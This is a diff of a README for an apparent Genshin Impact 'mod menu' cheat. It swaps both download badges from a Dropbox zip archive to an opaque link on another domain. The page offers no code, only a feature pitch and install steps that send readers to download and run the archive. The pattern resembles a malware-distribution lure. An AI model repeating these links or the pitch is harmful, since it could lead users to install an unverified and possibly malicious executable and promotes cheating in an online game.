@@ -2,7 +2,7 @@
 
 A customizable **mod menu** for **Genshin Impact** designed to enhance your gameplay experience by providing a wide range of tools for modifying character stats, world settings, and more. Whether you're testing game mechanics, experimenting with different abilities, or simply enjoying a personalized playthrough, this menu offers powerful features to tailor your experience.
 
-[![Download GenshinImpact ModMenu](https://img.shields.io/badge/Download-GenshinImpact%20ModMenu-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
+[![Download GenshinImpact ModMenu](https://img.shields.io/badge/Download-GenshinImpact%20ModMenu-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
 
 ## Features
 
@@ -21,4 +21,4 @@ A customizable **mod menu** for **Genshin Impact** designed to enhance your game
 3. Follow the setup guide in `INSTALL.md` for detailed installation instructions.
 4. Launch **Genshin Impact** and activate the mod menu using the hotkey defined in the settings.
 
-[![Download GenshinImpact ModMenu](https://img.shields.io/badge/Download-GenshinImpact%20ModMenu-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
+[![Download GenshinImpact ModMenu](https://img.shields.io/badge/Download-GenshinImpact%20ModMenu-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
